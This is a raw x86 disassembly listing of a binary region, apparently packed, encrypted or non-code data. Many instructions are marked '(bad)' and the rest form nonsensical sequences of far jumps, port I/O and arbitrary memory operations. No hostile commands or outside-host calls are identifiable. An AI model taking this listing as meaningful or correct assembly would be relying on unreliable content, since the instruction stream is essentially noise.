  409ec9:	jo     0x409e7e
  409ecb:	mov    cl,0x9e
  409ecd:	or     ecx,DWORD PTR [ebx-0x48]
  409ed0:	aaa    
  409ed1:	lea    edi,[esp+ecx*2-0x5d5cf8ac]
  409ed8:	jg     0x409e91
  409eda:	jo     0x409eac
  409edc:	aad    0x6d
  409ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409edf:	gs out 0x3a,eax
  409ee2:	(bad)  
  409ee3:	mov    DWORD PTR [edi-0x1b],esp
  409ee6:	push   ss
  409ee7:	in     eax,0x11
  409ee9:	scas   eax,DWORD PTR es:[edi]
  409eea:	lods   eax,DWORD PTR ds:[esi]
  409eeb:	in     al,0x65
  409eed:	or     eax,DWORD PTR [edi+eiz*2-0x42]
  409ef1:	(bad)  
  409ef2:	sbb    dl,BYTE PTR [edx-0x4dbd251d]
  409ef8:	aad    0x40
  409efa:	and    eax,0xf81ab233
  409eff:	mov    ecx,0x3e1e2a51
  409f04:	dec    ebx
  409f05:	inc    esi
  409f06:	mov    dh,0xf8
  409f08:	mov    ch,0xf7
  409f0a:	sub    al,0xae
  409f0c:	or     al,0xa4
  409f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0f:	mov    dh,0xbe
  409f11:	ss push eax
  409f13:	add    bl,dh
  409f15:	dec    ecx
  409f16:	adc    ecx,DWORD PTR [esp+eax*8-0x1b43e45e]
  409f1d:	pop    eax
  409f1e:	(bad)  [edx]
  409f20:	pop    ss
  409f21:	popf   
  409f22:	jmp    0xd9b6fae9
  409f27:	pushf  
  409f28:	push   esi
  409f29:	leave  
  409f2a:	mov    dl,0xe2
  409f2c:	(bad)  
  409f2d:	or     BYTE PTR [eax+edx*8],dh
  409f30:	dec    edi
  409f31:	cs stos BYTE PTR es:[edi],al
  409f33:	xor    al,BYTE PTR [esi+0x571c7bc7]
  409f39:	jmp    0xe0bf9cff
  409f3e:	lock fiadd WORD PTR [esi-0x6fcf31f0]
  409f45:	adc    al,0xc7
  409f47:	mov    eax,ds:0xacbb045
  409f4c:	aaa    
  409f4d:	mov    ah,0x60
  409f4f:	add    ch,cl
  409f51:	jbe    0x409f73
  409f53:	dec    edi
  409f54:	sub    BYTE PTR [ebx],0x46
  409f57:	jmp    0xd75f:0x9cfb9d84
  409f5e:	cmp    ch,BYTE PTR [ebp+0x744a92a9]
  409f64:	mov    ds:0x9da4f616,eax
  409f69:	add    eax,0xf7659489
  409f6e:	pusha  
  409f6f:	cdq    
  409f70:	iret   
  409f71:	cmp    ebp,0x82f9216e
  409f77:	mov    ebp,0x58536ab7
  409f7c:	adc    BYTE PTR [eax-0x79],al
  409f7f:	loop   0x409fa6
  409f81:	pop    esi
  409f82:	rol    BYTE PTR [edi+0x5033072b],0xdf
  409f89:	ror    BYTE PTR [ebx+0x4bd65587],1
  409f8f:	xor    dh,BYTE PTR [edx+edi*4-0x15]
  409f93:	loopne 0x409fa1
  409f95:	in     al,dx
  409f96:	popf   
  409f97:	mov    edx,0xbef5f8df
  409f9c:	or     esi,eax
  409f9e:	dec    edx
  409f9f:	or     DWORD PTR [esi+0x2a134892],edx
  409fa5:	in     eax,0xbd
  409fa7:	mov    cl,0x4c
  409fa9:	xchg   DWORD PTR [ecx+0x1df513],eax
  409faf:	mov    ecx,0x17a84005
  409fb4:	inc    esp
  409fb5:	(bad)  
  409fb6:	fild   QWORD PTR [eax+0x9]
  409fb9:	sbb    al,0x6f
  409fbb:	pop    es
  409fbc:	adc    al,BYTE PTR [ebx-0x38]
  409fbf:	dec    BYTE PTR es:[eax]
  409fc2:	mov    dl,0xf0
  409fc4:	outs   dx,BYTE PTR ds:[esi]
  409fc5:	test   al,0xb4
  409fc7:	repz jle 0x409f7f
  409fca:	and    BYTE PTR [ebx+0x55],bh
  409fcd:	aam    0x50
  409fcf:	outs   dx,BYTE PTR ds:[esi]
  409fd0:	lds    eax,FWORD PTR [ecx+0x71]
  409fd3:	cwde   
  409fd4:	cmp    al,0x8d
  409fd6:	pop    ds
  409fd7:	sub    bl,BYTE PTR [esi+0x71a6e555]
  409fdd:	fdivr  QWORD PTR [edx]
  409fdf:	xchg   ebp,eax
  409fe0:	xor    DWORD PTR [eax],edx
  409fe2:	inc    esp
  409fe3:	in     al,0x3f
  409fe5:	pop    eax
  409fe6:	fcmovnb st,st(0)
  409fe8:	jecxz  0x40a019
  409fea:	leave  
  409feb:	jmp    0x8658f41c
  409ff0:	ja     0x409fdc
  409ff2:	es xor eax,0x44f70a7b
  409ff8:	mov    ds:0x91049283,eax
  409ffd:	jg     0x409fbb
  409fff:	push   ecx
  40a000:	mov    eax,0x1a6b54a0
  40a005:	push   ebp
  40a006:	jae    0x40a014
  40a008:	in     al,0xc4
  40a00a:	and    esi,ebx
  40a00c:	adc    eax,0xbc18dcc
  40a011:	ror    eax,1
  40a013:	retf   
  40a014:	lahf   
  40a015:	leave  
  40a016:	fst    QWORD PTR [eax-0x3542919f]
  40a01c:	fbstp  TBYTE PTR [ebp+ecx*4+0x2a]
  40a020:	mov    ch,BYTE PTR [ebp+0x72]
  40a023:	mov    WORD PTR [ecx-0x3],ss
  40a026:	cs pop ebp
  40a028:	(bad)  
  40a02a:	mov    ebx,ebx
  40a02c:	stos   DWORD PTR es:[edi],eax
  40a02d:	fucomip st,st(7)
  40a02f:	adc    BYTE PTR [esi-0x5f8aa08e],0xbe
  40a036:	imul   esi,DWORD PTR [esi],0xfffffff2
  40a039:	mov    ebx,0xe0fce997
  40a03e:	shr    esi,1
  40a040:	daa    
  40a041:	mov    bl,0xee
  40a043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a044:	jb     0x409fc9
  40a046:	or     bh,bh
  40a048:	and    ch,BYTE PTR [eax]
  40a04a:	push   ebp
  40a04b:	(bad)  
  40a04c:	mov    ah,0x19
  40a04e:	or     esp,DWORD PTR [ebp+0x2c9bf244]
  40a054:	in     al,0xdf
  40a056:	jo     0x40a035
  40a058:	mov    edi,0xd6c4702d
  40a05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a05e:	int3   
  40a05f:	in     eax,dx
  40a060:	push   edx
  40a061:	mov    bh,0x32
  40a063:	popa   
  40a064:	xor    eax,0x5d94df14
  40a069:	mov    ds:0xcdb45560,eax
  40a06e:	sub    al,0x97
  40a070:	jmp    0x83a1:0x8e5a4034
  40a077:	push   eax
  40a078:	test   ebx,0xac102170
  40a07e:	je     0x40a0ab
  40a080:	adc    al,0x6b
  40a082:	pusha  
  40a083:	fndisi(8087 only) 
  40a085:	xor    al,0xf0
  40a087:	popf   
  40a088:	mov    BYTE PTR ds:0x9ee523b9,0x23
  40a08f:	data16 fld TBYTE PTR [edx+0x3d98503c]
  40a096:	pminsw mm2,QWORD PTR es:[ebp+0x28f500e3]
  40a09e:	dec    eax
  40a09f:	test   DWORD PTR [ebx+0x9],edi
  40a0a2:	jmp    0x40a0c1
  40a0a4:	in     al,0xb4
  40a0a6:	in     al,dx
  40a0a7:	bound  ebp,QWORD PTR [edi-0x6010a3da]
  40a0ad:	add    bl,BYTE PTR [edi-0x2239dd64]
  40a0b3:	mov    esp,0xe666a01b
  40a0b8:	mov    edx,0x53113c90
  40a0bd:	dec    edi
  40a0be:	sub    edx,esp
  40a0c0:	cmp    bh,dl
  40a0c2:	pop    ecx
  40a0c3:	lock jp 0x40a082
  40a0c6:	pextrw eax,mm6,0xc3
  40a0ca:	jne    0x40a108
  40a0cc:	stos   BYTE PTR es:[edi],al
  40a0cd:	inc    eax
  40a0ce:	popa   
  40a0cf:	test   BYTE PTR [esi+0x2],dh
  40a0d2:	lock test DWORD PTR [ebx-0x78d1469c],eax
  40a0d9:	sbb    eax,0x756c75a1
  40a0de:	pop    ebx
  40a0df:	push   cs
  40a0e0:	xor    DWORD PTR [eax+ebx*2-0x7c12ee44],esi
  40a0e7:	cli    
  40a0e8:	add    BYTE PTR [ebx+esi*8-0x7eee37cf],al
  40a0ef:	push   ds
  40a0f0:	jle    0x40a098
  40a0f2:	mov    ds:0xa0131eef,al
  40a0f7:	sbb    BYTE PTR [ecx+eiz*8],ah
  40a0fa:	lods   al,BYTE PTR ds:[esi]
  40a0fb:	in     eax,dx
  40a0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0fd:	scas   al,BYTE PTR es:[edi]
  40a0fe:	sbb    BYTE PTR [eax-0x5c],0xcc
  40a102:	jecxz  0x40a0d0
  40a104:	test   al,0xe4
  40a106:	test   BYTE PTR ds:0x900af47e,dh
  40a10c:	mov    ds:0x6707a0c3,eax
  40a111:	mov    ds:0x94ce223a,al
  40a116:	xchg   ecx,eax
  40a117:	scas   eax,DWORD PTR es:[edi]
  40a118:	xchg   edx,eax
  40a119:	jecxz  0x40a0bd
  40a11b:	ret    
  40a11c:	jne    0x40a142
  40a11e:	mov    bl,0xf5
  40a120:	(bad)  
  40a121:	rcl    esi,1
  40a123:	jp     0x40a102
  40a125:	scas   eax,DWORD PTR es:[edi]
  40a126:	push   ebx
  40a127:	or     edi,0x868c6ee2
  40a12d:	lock das 
  40a12f:	cmp    BYTE PTR [eax-0xdffda91],0x8d
  40a136:	pop    edx
  40a137:	stos   BYTE PTR es:[edi],al
  40a138:	cmp    BYTE PTR ds:0x6aee3661,bl
  40a13e:	sub    al,0x4b
  40a140:	arpl   WORD PTR [eax-0x532a3e95],bx
  40a146:	pusha  
  40a147:	ins    DWORD PTR es:[edi],dx
  40a148:	scas   al,BYTE PTR es:[edi]
  40a149:	aas    
  40a14a:	(bad)  
  40a14b:	in     al,dx
  40a14c:	jb     0x40a177
  40a14e:	adc    ax,0x453e
  40a152:	or     BYTE PTR [esi],cl
  40a154:	loopne 0x40a19e
  40a156:	rcl    BYTE PTR [edx],cl
  40a158:	mov    es,esp
  40a15a:	retf   0x3db4
  40a15d:	(bad)  
  40a15e:	out    dx,eax
  40a15f:	retf   
  40a160:	mov    ebx,0x2cbe9056
  40a165:	jo     0x40a19e
  40a167:	sub    dl,BYTE PTR [ebx]
  40a169:	fild   QWORD PTR [eax+0x36]
  40a16c:	sub    edx,0xe
  40a16f:	pushf  
  40a170:	jae    0x40a1d2
  40a172:	or     edi,DWORD PTR fs:[edi-0x5e]
  40a176:	xor    BYTE PTR [eax],al
  40a178:	into   
  40a179:	retf   
  40a17a:	dec    esp
  40a17b:	adc    eax,0x1f142b40
  40a180:	(bad)  
  40a181:	(bad)  
  40a182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a183:	shl    BYTE PTR [eax],0x13
  40a186:	mov    al,cl
  40a188:	pop    ss
  40a189:	pop    ecx
  40a18a:	call   0xe88a:0x6e257c57
  40a191:	inc    ecx
  40a192:	lds    ecx,FWORD PTR [esi-0x5b]
  40a195:	sub    eax,DWORD PTR ds:0x9147adfa
  40a19b:	xchg   dl,bl
  40a19d:	(bad)  
  40a19e:	test   al,0xb7
  40a1a0:	mov    ebp,0x13f19012
  40a1a5:	repz js 0x40a1cb
  40a1a8:	sbb    DWORD PTR [ebx-0x71],0xffffffb2
  40a1ac:	push   ebp
  40a1ad:	stos   DWORD PTR es:[edi],eax
  40a1ae:	fisttp DWORD PTR [edx+0x7f]
  40a1b1:	stos   BYTE PTR es:[edi],al
  40a1b2:	cmp    DWORD PTR [ebp+0x29573ed3],ebp
  40a1b8:	imul   esi,DWORD PTR [ecx+ebp*2],0xffffffc2
  40a1bc:	xor    edx,DWORD PTR [ebx-0x3fb44646]
  40a1c2:	pop    ebp
  40a1c3:	test   eax,0x3219020f
  40a1c8:	call   0x268b:0xddfa9ca7
  40a1cf:	shr    ebp,1
  40a1d1:	retf   
  40a1d2:	pop    eax
  40a1d3:	sub    BYTE PTR [edi+0x29],dl
  40a1d6:	mov    esi,0x53732319
  40a1db:	xor    al,0x63
  40a1dd:	fstp   QWORD PTR [edi]
  40a1df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e0:	sahf   
  40a1e1:	mov    BYTE PTR ds:0x71daf0ba,bh
  40a1e7:	adc    BYTE PTR [eax+0x6c],al
  40a1ea:	add    edi,DWORD PTR [esi-0x6e]
  40a1ed:	and    al,0xbe
  40a1ef:	mov    eax,0xfd8db511
  40a1f4:	int3   
  40a1f5:	js     0x40a217
  40a1f7:	sub    al,0x4a
  40a1f9:	rol    BYTE PTR [esi+0x253ea1a],1
  40a1ff:	(bad)  [ebx]
  40a201:	push   0x562fec45
  40a206:	icebp  
  40a207:	scas   eax,DWORD PTR es:[edi]
  40a208:	xchg   ebx,eax
  40a209:	mov    esp,esi
  40a20b:	jne    0x40a25c
  40a20d:	aad    0x99
  40a20f:	sub    al,0x95
  40a211:	test   al,0x1b
  40a213:	popa   
  40a214:	arpl   WORD PTR [edx],di
  40a216:	cmc    
  40a217:	int3   
  40a218:	hlt    
  40a219:	mov    ah,0xf6
  40a21b:	and    eax,0xdbc23bc0
  40a220:	test   al,0xe6
  40a222:	xlat   BYTE PTR ds:[ebx]
  40a223:	or     BYTE PTR [edx+edi*8],al
  40a226:	les    ebp,FWORD PTR [edi+ebx*4-0x1f]
  40a22a:	nop
  40a22b:	outs   dx,BYTE PTR ds:[esi]
  40a22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22d:	inc    esp
  40a22e:	add    dh,BYTE PTR [edi]
  40a230:	and    bh,BYTE PTR [edi-0x77bbeb93]
  40a236:	jno    0x40a275
  40a238:	popf   
  40a239:	jmp    0x40a223
  40a23b:	scas   eax,DWORD PTR es:[edi]
  40a23c:	adc    al,0x7d
  40a23e:	or     al,0x1a
  40a240:	or     esp,DWORD PTR [ecx]
  40a242:	mov    ds:0x3ec6d473,eax
  40a247:	mov    ds:0xee166ee2,al
  40a24c:	nop
  40a24d:	xchg   edi,eax
  40a24e:	in     eax,0xdf
  40a250:	mov    esp,0x36fe88e7
  40a255:	xor    al,0x57
  40a257:	mov    dl,ch
  40a259:	mov    ebx,0x117231c
  40a25e:	sub    DWORD PTR [ecx],0x61ba69f1
  40a264:	or     eax,ebp
  40a266:	sti    
  40a267:	call   0xb0ad:0x94cb79f2
  40a26e:	cwde   
  40a26f:	pop    edx
  40a270:	mov    dl,0x4b
  40a272:	gs pop edi
  40a274:	mov    esp,0x4fb49ee9
  40a279:	(bad)  
  40a27a:	push   eax
  40a27b:	dec    eax
  40a27c:	lock pushf 
  40a27e:	jno    0x40a23d
  40a280:	or     BYTE PTR [edx+0x721754c0],ah
  40a286:	int    0xc3
  40a288:	in     al,dx
  40a289:	jmp    0x40a24a
  40a28b:	adc    al,0x5c
  40a28d:	jne    0x40a2d8
  40a28f:	add    BYTE PTR [edx],al
  40a291:	shl    bl,cl
  40a293:	loope  0x40a24d
  40a295:	jnp    0x40a2ed
  40a297:	pop    esp
  40a298:	mov    al,0xa1
  40a29a:	leave  
  40a29b:	mov    al,ds:0x9466e886
  40a2a0:	add    DWORD PTR [ebx+0x3f],ecx
  40a2a3:	inc    ecx
  40a2a4:	xor    esp,edi
  40a2a6:	dec    ebx
  40a2a7:	mov    eax,0x947af5f8
  40a2ac:	jb     0x40a27c
  40a2ae:	xor    al,0xb0
  40a2b0:	call   0x414d9dea
  40a2b5:	add    DWORD PTR [edi-0x5c],0xffffff98
  40a2b9:	mov    esp,0x60f88d59
  40a2be:	jne    0x40a261
  40a2c0:	cdq    
  40a2c1:	and    eax,0x89da12a8
  40a2c6:	je     0x40a30d
  40a2c8:	push   eax
  40a2c9:	mov    ds:0x70d67416,eax
  40a2ce:	inc    ecx
  40a2cf:	xchg   edi,eax
  40a2d0:	(bad)  
  40a2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d2:	sahf   
  40a2d3:	sub    cl,BYTE PTR [eax+eiz*2+0x49]
  40a2d7:	sbb    DWORD PTR [eax+0x3f],ebp
  40a2da:	adc    al,0x4a
  40a2dc:	mov    BYTE PTR [ebx-0x37],0xd
  40a2e0:	xchg   ebp,eax
  40a2e1:	sahf   
  40a2e2:	scas   eax,DWORD PTR es:[edi]
  40a2e3:	mov    bh,0xc9
  40a2e5:	inc    BYTE PTR [ebx-0x4dca596d]
  40a2eb:	jb     0x40a2cf
  40a2ed:	mov    esi,0xf63f1d0f
  40a2f2:	push   esp
  40a2f3:	fdiv   DWORD PTR [ebx-0x3ab40d3d]
  40a2f9:	cmp    al,0x65
  40a2fb:	jmp    0x361a61b8
  40a300:	xchg   edi,eax
  40a301:	dec    ebp
  40a302:	inc    ebx
  40a303:	jmp    0xd391:0xb759e762
  40a30a:	mov    al,ds:0x53a3799a
  40a30f:	xor    esp,DWORD PTR [ebp+0x4987cf20]
  40a315:	adc    BYTE PTR ds:0xc8812318,ch
  40a31b:	out    dx,eax
  40a31c:	(bad)  [ebx+0xf5675f0]
  40a322:	jecxz  0x40a34d
  40a324:	ss call 0xde6a:0xcd93ca71
  40a32c:	inc    ecx
  40a32d:	push   ecx
  40a32e:	jle    0x40a334
  40a330:	jbe    0x40a2e5
  40a332:	jmp    0xc595d6ff
  40a337:	mov    ds:0xdedff8c0,al
  40a33c:	push   ds
  40a33d:	jnp    0x40a378
  40a33f:	mov    ds,WORD PTR [bx+si]
  40a342:	repz sbb ebp,ebp
  40a345:	inc    esi
  40a346:	fisttp QWORD PTR [ecx+edi*2+0x5445c9fd]
  40a34d:	lods   al,BYTE PTR ds:[esi]
  40a34e:	(bad)  
  40a34f:	fiadd  WORD PTR [esi+0x4eb89041]
  40a355:	xor    edi,DWORD PTR [ebp+0x407f9fda]
  40a35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a35c:	leave  
  40a35d:	lds    ebp,FWORD PTR [ecx]
  40a35f:	inc    esp
  40a360:	test   esp,esi
  40a362:	aad    0xc8
  40a364:	xchg   DWORD PTR [ebp-0x79],edi
  40a367:	mov    ebx,0xab6f2516
  40a36c:	ja     0x40a375
  40a36e:	jge    0x40a30c
  40a370:	inc    eax
  40a371:	add    DWORD PTR [eax+esi*8+0x3531f77],edi
  40a378:	and    esp,DWORD PTR [edi+edi*4]
  40a37b:	dec    eax
  40a37c:	dec    ecx
  40a37d:	adc    bl,BYTE PTR [eax-0x1d]
  40a380:	jg     0x40a350
  40a382:	in     al,dx
  40a383:	hlt    
  40a384:	inc    eax
  40a385:	and    BYTE PTR [ebx+0xe],dl
  40a388:	or     DWORD PTR [eax-0x6f],eax
  40a38b:	lods   al,BYTE PTR ds:[esi]
  40a38c:	inc    edx
  40a38d:	stos   BYTE PTR es:[edi],al
  40a38e:	in     eax,dx
  40a38f:	xchg   edx,eax
  40a390:	cmp    DWORD PTR [ebp+0x76ab30f1],esp
  40a396:	fist   DWORD PTR [edx]
  40a398:	pop    ecx
  40a399:	aas    
  40a39a:	add    DWORD PTR [edx+esi*8-0x71],ebx
  40a39e:	add    eax,0xc93d1d6a
  40a3a3:	sbb    al,0x38
  40a3a5:	mul    DWORD PTR [eax+esi*8]
  40a3a8:	jg     0x40a38c
  40a3aa:	push   0x3b
  40a3ac:	leave  
  40a3ad:	outs   dx,BYTE PTR ds:[esi]
  40a3ae:	outs   dx,BYTE PTR ds:[esi]
  40a3af:	dec    ecx
  40a3b0:	dec    DWORD PTR [ecx]
  40a3b2:	add    dl,ah
  40a3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b5:	jecxz  0x40a372
  40a3b7:	pop    es
  40a3b8:	mov    ecx,0x6cad4e83
  40a3bd:	add    DWORD PTR [ecx+0x4e],esp
  40a3c0:	xlat   BYTE PTR ds:[ebx]
  40a3c1:	or     bl,BYTE PTR [ebp+0x2dd28896]
  40a3c7:	dec    eax
  40a3c8:	fdivp  st(5),st
  40a3ca:	gs dec esi
  40a3cc:	push   ds
  40a3cd:	loopne 0x40a3aa
  40a3cf:	imul   esp,DWORD PTR [eax],0x57
  40a3d2:	not    BYTE PTR [ebx+0x66]
  40a3d5:	into   
  40a3d6:	popf   
  40a3d7:	fsin   
  40a3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3da:	pop    eax
  40a3db:	pusha  
  40a3dc:	dec    ebx
  40a3dd:	in     eax,dx
  40a3de:	xor    BYTE PTR [edi],al
  40a3e0:	xchg   ebp,eax
  40a3e1:	or     DWORD PTR [ecx+0x3baa419d],esi
  40a3e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3e8:	in     al,dx
  40a3e9:	out    dx,eax
  40a3ea:	adc    DWORD PTR [edi-0x689bb381],0x164613a1
  40a3f4:	pop    ebx
  40a3f5:	lea    ebp,[edi-0x1a]
  40a3f8:	gs into 
  40a3fa:	(bad)  
  40a3fb:	cwde   
  40a3fc:	stos   BYTE PTR es:[edi],al
  40a3fd:	dec    eax
  40a3fe:	push   ecx
  40a3ff:	fstp   TBYTE PTR [edx+0x74f9cfc4]
  40a405:	jnp    0x40a3a6
  40a407:	aad    0x18
  40a409:	add    al,0xfb
  40a40c:	lahf   
  40a40d:	ja     0x40a452
  40a40f:	add    ch,BYTE PTR [esi-0x6e]
  40a412:	jp     0x40a3ba
  40a414:	push   ebp
  40a415:	cmp    al,0xb1
  40a417:	and    BYTE PTR [edi-0x10941139],0xfc
  40a41e:	push   ecx
  40a41f:	popf   
  40a420:	inc    esi
  40a421:	pop    edx
  40a422:	push   0xfffffffb
  40a424:	mov    WORD PTR [ebp+ebx*8-0x34],ss
  40a428:	out    dx,eax
  40a429:	push   esp
  40a42a:	in     eax,dx
  40a42b:	test   al,0xb1
  40a42d:	dec    edx
  40a42e:	lds    ecx,FWORD PTR [edi+ecx*2]
  40a431:	dec    ebx
  40a432:	mov    ds:0x6a00e610,eax
  40a437:	lods   eax,DWORD PTR ds:[esi]
  40a438:	test   DWORD PTR [ebx-0x41b6e725],ebp
  40a43e:	mov    esi,0xae1ea80c
  40a443:	sub    eax,0xc95e25b6
  40a448:	adc    ebp,DWORD PTR [esi-0x73]
  40a44b:	les    ebp,FWORD PTR [ebp+0x42fdde93]
  40a451:	das    
  40a452:	add    al,0xff
  40a454:	and    cl,ch
  40a456:	jmp    0x40a4ab
  40a458:	icebp  
  40a459:	scas   al,BYTE PTR es:[edi]
  40a45a:	mov    DWORD PTR ds:0xf2f2c0dd,esp
  40a460:	cmp    edx,eax
  40a462:	clc    
  40a463:	js     0x40a47f
  40a465:	mov    esp,0xa51c3924
  40a46a:	sub    al,BYTE PTR [eax+0x51]
  40a46d:	ja     0x40a469
  40a46f:	daa    
  40a470:	shl    DWORD PTR [ecx+0x6d474672],0xc6
  40a477:	mov    ds:0xc30953c7,eax
  40a47c:	outs   dx,BYTE PTR ds:[esi]
  40a47d:	jnp    0x40a4b0
  40a47f:	push   cs
  40a480:	shl    DWORD PTR [ecx-0x16b43bc0],1
  40a486:	mov    ecx,ebp
  40a488:	data16 loopne 0x40a41d
  40a48b:	push   0xffffffcf
  40a48d:	stos   DWORD PTR es:[edi],eax
  40a48e:	rcl    bl,0x5
  40a491:	jge    0x40a4a3
  40a493:	jo     0x40a421
  40a495:	outs   dx,DWORD PTR ds:[esi]
  40a496:	mov    ah,0x39
  40a498:	mov    ebp,0x3e835717
  40a49d:	and    DWORD PTR [edx],esi
  40a49f:	or     dh,ch
  40a4a1:	xlat   BYTE PTR ds:[ebx]
  40a4a2:	push   0x46
  40a4a4:	inc    edi
  40a4a5:	das    
  40a4a6:	jbe    0x40a4cb
  40a4a8:	fsubp  st(3),st
  40a4aa:	pop    edi
  40a4ab:	mov    ebx,0x325e57a5
  40a4b0:	jnp    0x40a464
  40a4b2:	iret   
  40a4b3:	call   DWORD PTR [eax-0x64]
  40a4b6:	out    dx,al
  40a4b7:	dec    esi
  40a4b8:	mov    dh,BYTE PTR [esi+0x4f]
  40a4bb:	jnp    0x40a4b4
  40a4bd:	arpl   WORD PTR [edi+0x3b2d1107],si
  40a4c3:	push   esi
  40a4c4:	inc    ecx
  40a4c5:	adc    al,0x59
  40a4c7:	push   ss
  40a4c8:	jnp    0x40a4cd
  40a4ca:	ss pop ss
  40a4cc:	int    0x75
  40a4ce:	fs inc eax
  40a4d0:	inc    esi
  40a4d1:	cwde   
  40a4d2:	pop    ecx
  40a4d3:	scas   eax,DWORD PTR es:[edi]
  40a4d4:	push   0x3f
  40a4d6:	cmp    eax,0x4d6704c3
  40a4db:	inc    ebx
  40a4dc:	ja     0x40a47e
  40a4de:	xchg   ebx,eax
  40a4df:	call   0x9b6e:0x232dbb56
  40a4e6:	out    dx,al
  40a4e7:	test   DWORD PTR [esp+ecx*8],esi
  40a4ea:	inc    edi
  40a4eb:	mov    edx,0x38f12d4d
  40a4f0:	xchg   ecx,eax
  40a4f1:	pop    ss
  40a4f2:	adc    ah,BYTE PTR [edx+0x45df6753]
  40a4f8:	pop    ecx
  40a4f9:	nop
  40a4fa:	mov    edx,0xde7c0f6b
  40a4ff:	sbb    dh,BYTE PTR [di+0x231a]
  40a504:	mov    DWORD PTR [ebp+0x6fec0162],0xc88bbb05
  40a50e:	lods   al,BYTE PTR ds:[esi]
  40a50f:	mov    ch,0x55
  40a511:	out    dx,al
  40a512:	das    
  40a513:	mov    esp,0xdf1bfe6b
  40a518:	cli    
  40a519:	(bad)  
  40a51a:	aad    0xcf
  40a51c:	push   esp
  40a51d:	push   edx
  40a51e:	mov    eax,0xef980ee7
  40a523:	cwde   
  40a524:	adc    dl,dh
  40a526:	out    dx,eax
  40a527:	push   es
  40a528:	popf   
  40a529:	repnz or DWORD PTR [edx+0x1bcf9360],esi
  40a530:	cli    
  40a531:	aad    0xc5
  40a533:	push   ss
  40a534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a535:	and    al,0xcb
  40a537:	retf   
  40a538:	and    DWORD PTR [esp+edx*1],ecx
  40a53b:	pusha  
  40a53c:	je     0x40a567
  40a53e:	or     al,0xd3
  40a540:	xchg   BYTE PTR [esi],ch
  40a542:	or     ecx,DWORD PTR [edx-0x282ad387]
  40a548:	mov    eax,0xff94c46c
  40a54d:	adc    al,0x50
  40a54f:	clc    
  40a550:	stc    
  40a551:	outs   dx,DWORD PTR ds:[esi]
  40a552:	xor    esp,DWORD PTR [edi-0x1849eb20]
  40a558:	inc    ebp
  40a559:	push   edx
  40a55a:	push   ecx
  40a55b:	xchg   edx,eax
  40a55c:	inc    ch
  40a55e:	xor    DWORD PTR [eax],0x40
  40a561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a562:	mov    cl,0xb7
  40a564:	ficomp WORD PTR [edx-0x187f4358]
  40a56a:	add    esp,DWORD PTR [edx]
  40a56c:	jbe    0x40a52a
  40a56e:	pop    ebp
  40a56f:	stc    
  40a570:	jne    0x40a5ac
  40a572:	dec    edi
  40a573:	xor    eax,0x5a207fb
  40a578:	inc    edx
  40a579:	jg     0x40a5c6
  40a57b:	cmp    al,0x9c
  40a57d:	pop    esp
  40a57e:	sahf   
  40a57f:	leave  
  40a580:	mov    dl,dl
  40a582:	stos   BYTE PTR es:[edi],al
  40a583:	in     eax,dx
  40a584:	test   al,0xee
  40a586:	mov    ebx,0x955db4ef
  40a58b:	push   esp
  40a58c:	pop    ebp
  40a58d:	enter  0xed4c,0x84
  40a591:	mov    esp,es
  40a593:	mov    DWORD PTR [eax-0x3e9685cc],esi
  40a599:	push   ebx
  40a59a:	ret    0x35f7
  40a59d:	jle    0x40a557
  40a59f:	jo     0x40a57a
  40a5a1:	dec    ebx
  40a5a2:	iret   
  40a5a3:	repnz (bad) 
  40a5a5:	aam    0xe4
  40a5a7:	shl    BYTE PTR [ebp-0x51e0fe7f],0x3d
  40a5ae:	sbb    esp,ecx
  40a5b0:	retf   
  40a5b1:	dec    ebp
  40a5b2:	(bad)  
  40a5b3:	push   ebp
  40a5b4:	fdivr  DWORD PTR [ecx]
  40a5b6:	or     edx,DWORD PTR [esi+0x5e]
  40a5b9:	popf   
  40a5ba:	cmp    BYTE PTR [esi+0x666c07c0],dh
  40a5c0:	fsubrp st(1),st
  40a5c2:	xchg   edx,eax
  40a5c3:	rcr    dl,1
  40a5c5:	pushf  
  40a5c6:	jg     0x40a58c
  40a5c8:	xchg   ebx,eax
  40a5c9:	mov    dl,0x69
  40a5cb:	push   esi
  40a5cc:	sub    eax,0xe5a6b7fd
  40a5d1:	in     eax,dx
  40a5d2:	push   esi
  40a5d3:	add    edx,DWORD PTR [eax-0x2aad2764]
  40a5d9:	or     bh,ah
  40a5db:	add    edx,DWORD PTR [eax+eiz*8+0x3a]
  40a5df:	loope  0x40a5e4
  40a5e1:	sbb    al,ch
  40a5e3:	mov    edi,0xc1031b16
  40a5e8:	xchg   esi,eax
  40a5e9:	jg     0x40a5eb
  40a5eb:	push   esi
  40a5ec:	shr    DWORD PTR [edx+0xf],cl
  40a5ef:	cmp    esi,eax
  40a5f1:	xchg   BYTE PTR [edx+0x19cdbd67],bl
  40a5f7:	add    ah,BYTE PTR [ecx-0x5c]
  40a5fa:	inc    ebx
  40a5fb:	ins    BYTE PTR es:[edi],dx
  40a5fc:	pop    ebx
  40a5fd:	mov    cl,0x5c
  40a5ff:	loopne 0x40a671
  40a601:	sub    BYTE PTR [edx-0x67e6a4f1],dh
  40a607:	sub    dl,BYTE PTR [edi-0x7120b1d6]
  40a60d:	test   eax,0x168ee392
  40a613:	mov    cl,0x4b
  40a615:	xlat   BYTE PTR ds:[ebx]
  40a616:	add    dl,BYTE PTR [eax+0x5]
  40a619:	ffree  st(0)
  40a61b:	lahf   
  40a61c:	int    0x55
  40a61e:	adc    eax,0x663ade79
  40a623:	(bad)
  40a626:	mov    esp,0x14041a3c
  40a62b:	aad    0x20
  40a62d:	mov    eax,ds:0x968069ba
  40a632:	jb     0x40a672
  40a634:	mov    ecx,0x74f6c720
